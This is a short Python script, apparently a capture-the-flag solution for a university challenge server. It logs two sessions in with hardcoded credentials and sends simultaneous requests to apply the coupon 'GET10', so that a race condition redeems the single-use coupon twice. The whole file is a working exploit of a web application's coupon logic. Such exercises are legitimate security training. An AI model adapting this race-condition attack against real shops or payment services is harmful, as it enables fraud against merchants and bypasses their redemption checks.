import requests as r
import threading
import time

url = 'http://cyberchallenge.disi.unitn.it:7902'

start_event = threading.Event()

def thread_func():
    s = r.Session()
    s.post(url + '/login', data={'username': 'degra', 'password': 'degra'})

    start_event.wait()
    res = s.post(url + '/apply_coupon', data={'coupon': 'GET10'})
    print(f"Response: {res.text}")

t1 = threading.Thread(target=thread_func)
t2 = threading.Thread(target=thread_func)

t1.start()
t2.start()

time.sleep(0.2)
start_event.set()

t1.join()
t2.join()
